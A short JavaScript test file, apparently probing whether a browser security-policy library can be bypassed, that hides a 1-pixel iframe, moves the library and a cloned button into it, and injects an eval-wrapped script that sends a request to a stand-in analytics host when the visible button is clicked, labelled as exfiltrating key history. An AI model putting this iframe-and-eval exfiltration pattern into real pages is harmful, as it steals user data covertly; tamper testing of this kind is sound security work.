// Library Tamper Testing - iFrame
// Exfiltrate data using XMLHTTP request
function click_inner() {
	var event = new Event('click');
	document.getElementById('test2').dispatchEvent(event);
}

// Collect Nodes
var pol = document.head.childNodes[5]; // policy.js
var tx = document.head.childNodes[7];  // libTx.js
var button = document.getElementById('test'); // button

// some setup
var button2 = button.cloneNode(true); // copy of button
button2.id="test2";
var script = document.createElement("script");
script.innerHTML='function exfiltrate_key_history() {var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=iframe", true);xmlhttp.send(null);\';eval(exp);}document.getElementById(\'test2\').onclick = exfiltrate_key_history;';

// create empty iframe
var frm = document.createElement("iframe");
frm.setAttribute('id', 'ifrm');
frm.setAttribute('src', "JavaScript:''");
frm.style.width="1px";
frm.style.height="1px";

// add content to iframe
frm.appendChild(tx);
frm.appendChild(button2);
frm.appendChild(script);

// add iframe to DOM
document.body.appendChild(frm);

document.getElementById('test').onclick = click_inner;
